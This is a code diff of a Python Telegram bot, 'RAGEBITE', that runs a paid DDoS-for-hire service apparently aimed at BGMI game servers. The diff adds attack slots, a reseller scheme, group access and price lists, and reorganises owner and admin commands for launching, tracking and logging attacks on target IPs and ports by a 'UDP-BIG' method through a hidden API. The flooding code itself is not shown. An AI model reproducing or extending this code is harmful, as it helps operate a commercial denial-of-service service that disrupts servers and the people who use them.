         timer_text = f"""⚡ ATTACK LAUNCHED!{admin_tag}
@@ -777,11 +1280,13 @@ Only 1 attack at a time per person.""")
 📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%
 
 ⌛ Finishes: {finish_time}
+📊 Active Attacks: {active_attacks}/{TOTAL_SLOTS}
 
 🔥 RAGEBITE ULTIMATE POWER
 
 ✅ Attack is running!
-📊 Timer will update every 5 seconds."""
+📊 Timer will update every 5 seconds.
+⚠️ You cannot start another attack until this finishes."""
     elif is_admin_user:
         admin_tag = " 👑 ADMIN"
         timer_text = f"""⚡ ATTACK LAUNCHED!{admin_tag}
@@ -792,11 +1297,13 @@ Only 1 attack at a time per person.""")
 📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%
 
 ⌛ Finishes: {finish_time}
+📊 Active Attacks: {active_attacks}/{TOTAL_SLOTS}
 
 🔥 RAGEBITE ULTIMATE POWER
 
 ✅ Attack is running!
-📊 Timer will update every 5 seconds."""
+📊 Timer will update every 5 seconds.
+⚠️ You cannot start another attack until this finishes."""
     else:
         timer_text = f"""⚡ ATTACK LAUNCHED!
 
@@ -806,11 +1313,14 @@ Only 1 attack at a time per person.""")
 📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%
 
 ⌛ Finishes: {finish_time}
+📊 Active Attacks: {active_attacks}/{TOTAL_SLOTS}
 
 🔥 RAGEBITE ULTIMATE POWER
 
 ✅ Attack is running!
-📊 Timer will update every 5 seconds."""
+📊 Timer will update every 5 seconds.
+⚠️ You cannot start another attack until this finishes.
+👥 Other users can attack simultaneously."""
     
     bot.edit_message_text(timer_text, chat_id, msg_id)
     
@@ -840,7 +1350,8 @@ Only 1 attack at a time per person.""")
 🔥 RAGEBITE - Ready for next attack!
 💪 You can start a new attack now.
 
-⚡ Ultimate Power - No Limits!"""
+⚡ Ultimate Power - No Limits!
+👥 Other users can attack simultaneously."""
             
             try:
                 bot.edit_message_text(final_text, chat_id, msg_id)
@@ -852,12 +1363,11 @@ Only 1 attack at a time per person.""")
     
     threading.Thread(target=notify_end, daemon=True).start()
 
-# ==================== ADMIN & OWNER COMMANDS ====================
+# ==================== ADMIN COMMANDS (User Management) ====================
 
 @bot.message_handler(commands=['addadmin'])
 @admin_only
 def add_admin_command(message):
-    """Admin can add other admins | Owner can also add admins"""
     user_id = str(message.chat.id)
     command = message.text.split()
     
@@ -867,22 +1377,18 @@ def add_admin_command(message):
     
     uid = command[1]
     
-    # Check if user is already admin
     if uid in state.get("admins", []):
         bot.reply_to(message, "ℹ️ User is already admin.")
         return
     
-    # Check if user is owner
     if uid in state.get("owners", []):
         bot.reply_to(message, "❌ Cannot add owner as admin.")
         return
     
-    # Check if trying to add self
     if uid == user_id:
         bot.reply_to(message, "❌ You are already admin.")
         return
     
-    # Add admin
     state["admins"].append(uid)
     save_state()
     
@@ -890,13 +1396,15 @@ def add_admin_command(message):
 
 👑 Admin Benefits:
 • Generate keys: /generate
-• Delete keys: /deletekey
 • Add users: /add
 • Remove users: /remove
 • See active attacks: /activeattacks
-• See attack history: /attackhistory
 • Add admins: /addadmin
 • Remove admins: /removeadmin
+• Add resellers: /addreseller
+• Remove resellers: /removereseller
+• Add groups: /addgroup
+• Remove groups: /removegroup
 
 📌 Note: Admin = 1 attack at a time (same as users)
 📌 Note: Owner cannot be removed""")
@@ -904,7 +1412,6 @@ def add_admin_command(message):
 @bot.message_handler(commands=['removeadmin'])
 @admin_only
 def remove_admin_command(message):
-    """Admin can remove other admins | Owner can also remove admins"""
     user_id = str(message.chat.id)
     command = message.text.split()
     
@@ -914,187 +1421,21 @@ def remove_admin_command(message):
     
     uid = command[1]
     
-    # Check if user is admin
     if uid not in state.get("admins", []):
         bot.reply_to(message, "❌ User is not admin.")
         return
     
-    # Check if trying to remove owner
     if uid in state.get("owners", []):
         bot.reply_to(message, "❌ Cannot remove owner.")
         return
     
-    # Check if trying to remove self
     if uid == user_id:
         bot.reply_to(message, "❌ You cannot remove yourself as admin.")
         return
     
-    # Remove admin
     state["admins"].remove(uid)
     save_state()
     bot.reply_to(message, f"✅ User {uid} removed from admins.")
-
-# ==================== OWNER COMMANDS ====================
-
-@bot.message_handler(commands=['ownerpanel'])
-@owner_only
-def owner_panel(message):
-    """Owner full control panel - API details still hidden even from owner"""
-    response = '''👑 RAGEBITE OWNER PANEL
-
-📊 SYSTEM STATUS:
-• Bot: Online ✅
-• API: Connected ✅
-• Method: UDP-BIG (Fixed)
-• Slots: 4
-
-📊 STATISTICS:
-• Total Users: ''' + str(len(allowed_user_ids)) + '''
-• Active Attacks: ''' + str(len([a for a in state["user_attacks"].values() if a["expires"] > now()])) + '''
-• Admins: ''' + str(len(state.get("admins", []))) + '''
-• Total Attacks: ''' + str(len(state.get("attack_history", []))) + '''
-
-🔐 API: Protected (Hidden from all users)
-
-👑 OWNER COMMANDS:
-/alladmins - List all admins
-/addadmin <id> - Add admin
-/removeadmin <id> - Remove admin
-/stats - Full statistics
-/clearbotstate - Clear all state
-
-🔐 SECURITY: HIGH
-💪 RAGEBITE POWER!'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['alladmins'])
-@owner_only
-def all_admins_command(message):
-    """Owner sees all admins"""
-    admins = state.get("admins", [])
-    
-    if not admins:
-        bot.reply_to(message, "ℹ️ No admins added.")
-        return
-    
-    response = "👑 Admins List:\n\n"
-    for admin in admins:
-        try:
-            user_info = bot.get_chat(int(admin))
-            username = f"@{user_info.username}" if user_info.username else admin
-            response += f"• {username} (ID: {admin})\n"
-        except:
-            response += f"• ID: {admin}\n"
-    
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['clearbotstate'])
-@owner_only
-def clear_bot_state_command(message):
-    """Owner: Clear all bot state"""
-    state["user_attacks"] = {}
-    state["attack_history"] = []
-    save_state()
-    bot.reply_to(message, "✅ Bot state cleared! All active attacks and history removed.")
-
-# ==================== ADMIN COMMANDS (User Management) ====================
-
-@bot.message_handler(commands=['activeattacks'])
-@admin_only
-def active_attacks_command(message):
-    """Admin: See all active attacks with details (NO API details)"""
-    current_time = now()
-    expired_users = []
-    for uid, attack in state["user_attacks"].items():
-        if attack["expires"] < current_time:
-            expired_users.append(uid)
-    
-    for uid in expired_users:
-        del state["user_attacks"][uid]
-    
-    if expired_users:
-        save_state()
-    
-    if not state["user_attacks"]:
-        bot.reply_to(message, "📊 No active attacks currently.")
-        return
-    
-    response = "🔥 ACTIVE ATTACKS:\n"
-    response += "═" * 30 + "\n\n"
-    
-    attack_count = 0
-    for uid, attack in state["user_attacks"].items():
-        if attack["expires"] > now():
-            attack_count += 1
-            remaining = int(attack["expires"] - now())
-            
-            is_owner_user = attack.get("is_owner", False)
-            is_admin_user = attack.get("is_admin", False)
-            
-            if is_owner_user:
-                tag = " 👑 OWNER"
-            elif is_admin_user:
-                tag = " 👑 ADMIN"
-            else:
-                tag = ""
-            
-            response += f"""#{attack_count} {attack.get('username', uid)}{tag}
-🎯 {attack['ip']}:{attack['port']}
-⏱ {attack['duration']}s | ⏳ {remaining}s left
-🕐 Started: {attack.get('start_time', 'Unknown')}
-─────────────────
-"""
-    
-    response += f"\n📊 Total Active: {attack_count}"
-    
-    if len(response) > 4000:
-        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
-        for part in parts:
-            bot.reply_to(message, part)
-    else:
-        bot.reply_to(message, response)
-
-@bot.message_handler(commands=['attackhistory'])
-@admin_only
-def attack_history_command(message):
-    """Admin: See attack history (NO API details)"""
-    history = state.get("attack_history", [])
-    
-    if not history:
-        bot.reply_to(message, "📊 No attack history yet.")
-        return
-    
-    recent = history[-20:]
-    
-    response = "📜 ATTACK HISTORY (Last 20):\n"
-    response += "═" * 30 + "\n\n"
-    
-    for i, entry in enumerate(reversed(recent), 1):
-        is_owner_user = entry.get("is_owner", False)
-        is_admin_user = entry.get("is_admin", False)
-        
-        if is_owner_user:
-            tag = " 👑 OWNER"
-        elif is_admin_user:
-            tag = " 👑 ADMIN"
-        else:
-            tag = ""
-        
-        response += f"""#{i} {entry.get('username', entry.get('user_id', 'Unknown'))}{tag}
-🎯 {entry['ip']}:{entry['port']}
-⏱ {entry['duration']}s
-🕐 {entry.get('start_time', 'Unknown')}
-─────────────────
-"""
-    
-    response += f"\n📊 Total Attacks: {len(history)}"
-    
-    if len(response) > 4000:
-        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
-        for part in parts:
-            bot.reply_to(message, part)
-    else:
-        bot.reply_to(message, response)
 
 @bot.message_handler(commands=['add'])
 @admin_only
@@ -1165,14 +1506,111 @@ def show_all_users(message):
                 status_icon = "🟢 Free"
             
             admin_tag = " 👑" if is_admin(uid) else ""
+            reseller_tag = " 🛒" if is_reseller(uid) else ""
             
-            response += f"• {username}{admin_tag} (ID: {uid}) - {status_icon}\n"
+            response += f"• {username}{admin_tag}{reseller_tag} (ID: {uid}) - {status_icon}\n"
         except:
             response += f"• ID: {uid}\n"
     
     bot.reply_to(message, response)
 
-# ==================== STATUS COMMANDS ====================
+@bot.message_handler(commands=['activeattacks'])
+@admin_only
+def active_attacks_command(message):
+    current_time = now()
+    expired_users = []
+    for uid, attack in state["user_attacks"].items():
+        if attack["expires"] < current_time:
+            expired_users.append(uid)
+    
+    for uid in expired_users:
+        del state["user_attacks"][uid]
+    
+    if expired_users:
+        save_state()
+    
+    if not state["user_attacks"]:
+        bot.reply_to(message, "📊 No active attacks currently.\n\n✅ All slots are free!")
+        return
+    
+    response = "🔥 ACTIVE ATTACKS:\n"
+    response += "═" * 30 + "\n\n"
+    
+    attack_count = 0
+    for uid, attack in state["user_attacks"].items():
+        if attack["expires"] > now():
+            attack_count += 1
+            remaining = int(attack["expires"] - now())
+            
+            is_owner_user = attack.get("is_owner", False)
+            is_admin_user = attack.get("is_admin", False)
+            
+            if is_owner_user:
+                tag = " 👑 OWNER"
+            elif is_admin_user:
+                tag = " 👑 ADMIN"
+            else:
+                tag = ""
+            
+            response += f"""#{attack_count} {attack.get('username', uid)}{tag}
+🎯 {attack['ip']}:{attack['port']}
+⏱ {attack['duration']}s | ⏳ {remaining}s left
+🕐 Started: {attack.get('start_time', 'Unknown')}
+─────────────────
+"""
+    
+    response += f"\n📊 Total Active: {attack_count}/{TOTAL_SLOTS}"
+    response += f"\n📌 Free Slots: {TOTAL_SLOTS - attack_count}"
+    
+    if len(response) > 4000:
+        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
+        for part in parts:
+            bot.reply_to(message, part)
+    else:
+        bot.reply_to(message, response)
+
+@bot.message_handler(commands=['attackhistory'])
+@admin_only
+def attack_history_command(message):
+    history = state.get("attack_history", [])
+    
+    if not history:
+        bot.reply_to(message, "📊 No attack history yet.")
+        return
+    
+    recent = history[-20:]
+    
+    response = "📜 ATTACK HISTORY (Last 20):\n"
+    response += "═" * 30 + "\n\n"
+    
+    for i, entry in enumerate(reversed(recent), 1):
+        is_owner_user = entry.get("is_owner", False)
+        is_admin_user = entry.get("is_admin", False)
+        
+        if is_owner_user:
+            tag = " 👑 OWNER"
+        elif is_admin_user:
+            tag = " 👑 ADMIN"
+        else:
+            tag = ""
+        
+        response += f"""#{i} {entry.get('username', entry.get('user_id', 'Unknown'))}{tag}
+🎯 {entry['ip']}:{entry['port']}
+⏱ {entry['duration']}s
+🕐 {entry.get('start_time', 'Unknown')}
+─────────────────
+"""
+    
+    response += f"\n📊 Total Attacks: {len(history)}"
+    
+    if len(response) > 4000:
+        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
+        for part in parts:
+            bot.reply_to(message, part)
+    else:
+        bot.reply_to(message, response)
+
+# ==================== STATUS & STATS COMMANDS ====================
 
 @bot.message_handler(commands=['status'])
 def status_attack(message):
@@ -1192,11 +1630,13 @@ def status_attack(message):
 
 ✅ Attack is in progress!
 ⏳ Will finish automatically.
-📨 You'll get notification when done.
+⚠️ You cannot start a new attack until this finishes.
 
 💪 Patience - Power is working!'''
             bot.reply_to(message, response)
             return
+    
+    active_attacks = len([a for a in state["user_attacks"].values() if a["expires"] > now()])
     
     if is_owner(user_id):
         response = f'''⚡ RAGEBITE STATUS - OWNER VIEW:
@@ -1206,7 +1646,11 @@ def status_attack(message):
 🔑 API: Protected (Hidden)
 ⚡ Method: UDP-BIG
 📊 Total Slots: {TOTAL_SLOTS}
-📊 Active Attacks: {len([a for a in state["user_attacks"].values() if a["expires"] > now()])}
+📊 Active Attacks: {active_attacks}/{TOTAL_SLOTS}
+📌 Free Slots: {TOTAL_SLOTS - active_attacks}
+
+👑 Owner: Unlimited attacks
+📌 Same user = 1 attack at a time
 
 📊 All systems operational!
 💪 Ultimate power ready!'''
@@ -1215,6 +1659,12 @@ def status_attack(message):
 
 🌐 Service Status: Online ✅
 📅 Server Time: {datetime.datetime.now().strftime('%H:%M:%S')}
+📊 Active Attacks: {active_attacks}/{TOTAL_SLOTS}
+📌 Free Slots: {TOTAL_SLOTS - active_attacks}
+
+👑 Admin: 1 attack at a time (same as users)
+👑 Owner: Unlimited attacks
+📌 Same user = 1 attack at a time
 
 📊 All systems operational!
 💪 Ultimate power ready!
@@ -1222,23 +1672,21 @@ def status_attack(message):
 👑 Admin Commands:
 • /addadmin - Add admin
 • /removeadmin - Remove admin
-• /activeattacks - See active attacks
-📌 Admin = 1 attack at a time (same as users)
-📌 Owner cannot be removed'''
+• /activeattacks - See active attacks'''
     else:
-        response = '''⚡ YOUR STATUS:
+        response = f'''⚡ YOUR STATUS:
 
 🎯 No active attack currently.
 💪 Ready to launch!
 
 Use /bgmi to start.
 📌 1 attack at a time per user.
+📊 Active Attacks: {active_attacks}/{TOTAL_SLOTS}
+📌 Free Slots: {TOTAL_SLOTS - active_attacks}
 
 🔥 Ragebite - Always Ready!'''
     
     bot.reply_to(message, response)
-
-# ==================== STATS COMMANDS ====================
 
 @bot.message_handler(commands=['stats'])
 def stats_command(message):
@@ -1254,14 +1702,19 @@ def stats_command(message):
 👥 Total Users: {total_users}
 🔥 Active Users: {active_users}
 👑 Admins: {len(state.get('admins', []))}
+🛒 Resellers: {len(state.get('resellers', []))}
+📌 Allowed Groups: {len(state.get('groups', []))}
 📜 Total Attacks: {history_count}
 📊 Total Slots: {TOTAL_SLOTS}
+📌 Free Slots: {TOTAL_SLOTS - active_users}
 
 📌 System Rules:
-• Users: 1 Attack at a time
-• Admin: 1 Attack at a time (same as users)
-• Owner: Unlimited attacks
-• Admin can add/remove admins
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Admin = 1 attack at a time (same as users)
+• Owner = Unlimited attacks
+• Groups can have access without keys
+• Admin can add/remove admins/resellers/groups
 • Owner cannot be removed
 • Method: UDP-BIG (Fixed)
 • API: Protected (Hidden)'''
@@ -1272,14 +1725,19 @@ def stats_command(message):
 👥 Total Users: {total_users}
 🔥 Active Users: {active_users}
 👑 Admins: {len(state.get('admins', []))}
+🛒 Resellers: {len(state.get('resellers', []))}
+📌 Allowed Groups: {len(state.get('groups', []))}
 📜 Total Attacks: {history_count}
 📊 Total Slots: {TOTAL_SLOTS}
+📌 Free Slots: {TOTAL_SLOTS - active_users}
 
 📌 System Rules:
-• Users: 1 Attack at a time
-• Admin: 1 Attack at a time (same as users)
-• Owner: Unlimited attacks
-• Admin can add/remove admins
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Admin = 1 attack at a time (same as users)
+• Owner = Unlimited attacks
+• Groups can have access without keys
+• Admin can add/remove admins/resellers/groups
 • Owner cannot be removed'''
     
     else:
@@ -1288,15 +1746,71 @@ def stats_command(message):
 👥 Total Users: {total_users}
 🔥 Active Users: {active_users}
 📜 Total Attacks: {history_count}
+📊 Total Slots: {TOTAL_SLOTS}
+📌 Free Slots: {TOTAL_SLOTS - active_users}
 
 📌 System Rules:
-• Users: 1 Attack at a time
 • Different users can attack simultaneously
+• Same user = 1 attack at a time
 • Max 300 seconds per attack
 
 🔑 Status: Active ✅'''
     
     bot.reply_to(message, response)
+
+# ==================== OWNER COMMANDS ====================
+
+@bot.message_handler(commands=['ownerpanel'])
+@owner_only
+def owner_panel(message):
+    active = len([a for a in state["user_attacks"].values() if a["expires"] > now()])
+    response = f'''👑 RAGEBITE OWNER PANEL
+
+📊 SYSTEM STATUS:
+• Bot: Online ✅
+• API: Connected ✅
+• Method: UDP-BIG (Fixed)
+• Slots: {TOTAL_SLOTS}
+
+📊 STATISTICS:
+• Total Users: {len(allowed_user_ids)}
+• Active Attacks: {active}/{TOTAL_SLOTS}
+• Admins: {len(state.get("admins", []))}
+• Resellers: {len(state.get("resellers", []))}
+• Allowed Groups: {len(state.get("groups", []))}
+• Total Attacks: {len(state.get("attack_history", []))}
+
+📌 RULES:
+• Different users can attack simultaneously
+• Same user = 1 attack at a time
+• Admin = 1 attack at a time (same as users)
+• Owner = Unlimited attacks
+• Groups can have access without keys
+
+🔐 API: Protected (Hidden from all users)
+
+👑 OWNER COMMANDS:
+/addadmin <id> - Add admin
+/removeadmin <id> - Remove admin
+/addreseller <id> <coins> - Add reseller
+/removereseller <id> - Remove reseller
+/addgroup <group_id> - Add group access
+/removegroup <group_id> - Remove group access
+/groups - List allowed groups
+/stats - Full statistics
+/clearbotstate - Clear all state
+
+🔐 SECURITY: HIGH
+💪 RAGEBITE POWER!'''
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['clearbotstate'])
+@owner_only
+def clear_bot_state_command(message):
+    state["user_attacks"] = {}
+    state["attack_history"] = []
+    save_state()
+    bot.reply_to(message, "✅ Bot state cleared! All active attacks and history removed.")
 
 # ==================== MAIN ====================
 def main():
@@ -1311,48 +1825,64 @@ def main():
     print("="*50)
     print(f"👑 Owner: {OWNER_ID}")
     print(f"👥 Admins: {state.get('admins', [])}")
+    print(f"🛒 Resellers: {state.get('resellers', [])}")
+    print(f"📌 Allowed Groups: {state.get('groups', [])}")
     print(f"👥 Users: {len(allowed_user_ids)}")
     print(f"🔑 API: Protected (Hidden from all users)")
     print(f"📊 Total Slots: {TOTAL_SLOTS}")
     print("="*50)
-    print("📌 USER PRICES (Rs):")
-    print("  • 12 Hours: 100 Rs")
-    print("  • 1 Day: 150 Rs")
-    print("  • 1 Week: 600 Rs")
-    print("  • 15 Days: 750 Rs")
-    print("  • 1 Month: 1400 Rs")
-    print("="*50)
-    print("📌 RESELLER PRICES (Coins - 10/day):")
-    print("  • 12 Hours: 5 coins")
-    print("  • 1 Day: 10 coins")
-    print("  • 1 Week: 70 coins")
-    print("  • 15 Days: 150 coins")
-    print("  • 1 Month: 300 coins")
-    print("="*50)
     print("📌 RULES:")
-    print("  • 4 Slots available")
-    print("  • 1 User = 1 Attack at a time")
-    print("  • Admin = 1 Attack at a time (same as users)")
+    print("  • 4 Attack Slots available")
+    print("  • Different users can attack simultaneously")
+    print("  • Same user = 1 attack at a time")
+    print("  • Admin = 1 attack at a time (same as users)")
     print("  • Owner = Unlimited attacks")
-    print("  • Admin can add/remove admins")
+    print("  • Groups can have access without keys")
+    print("  • Admin can add/remove admins/resellers/groups")
     print("  • Owner cannot be removed")
     print("  • Method: UDP-BIG (Fixed)")
+    print("="*50)
+    print("📌 PRICES:")
+    print("  USER PRICES (Rs):")
+    print("    • 1 Hour: 20 Rs")
+    print("    • 1 Day: 150 Rs")
+    print("    • 2 Days: 300 Rs")
+    print("    • 1 Week: 600 Rs")
+    print("    • 15 Days: 750 Rs")
+    print("    • 1 Month: 1400 Rs")
+    print("  RESELLER PRICES (Coins):")
+    print("    • 1 Hour: 20 coins")
+    print("    • 1 Day: 150 coins")
+    print("    • 2 Days: 300 coins")
+    print("    • 1 Week: 600 coins")
+    print("    • 15 Days: 750 coins")
+    print("    • 1 Month: 1400 coins")
     print("="*50)
     print("👑 OWNER COMMANDS:")
     print("  • /ownerpanel - Full control")
     print("  • /addadmin - Add admin")
     print("  • /removeadmin - Remove admin")
+    print("  • /addreseller - Add reseller")
+    print("  • /removereseller - Remove reseller")
+    print("  • /addgroup - Add group access")
+    print("  • /removegroup - Remove group access")
+    print("  • /groups - List allowed groups")
     print("="*50)
     print("👑 ADMIN COMMANDS:")
     print("  • /generate - Generate keys")
-    print("  • /deletekey - Delete keys")
     print("  • /add - Add users")
     print("  • /remove - Remove users")
     print("  • /activeattacks - See active attacks")
     print("  • /addadmin - Add admin")
     print("  • /removeadmin - Remove admin")
+    print("  • /addreseller - Add reseller")
+    print("  • /removereseller - Remove reseller")
+    print("  • /addgroup - Add group access")
+    print("  • /removegroup - Remove group access")
+    print("  • /groups - List allowed groups")
     print("="*50)
     print("✅ Bot is running...")
+    print("="*50)
     
     while True:
         try:
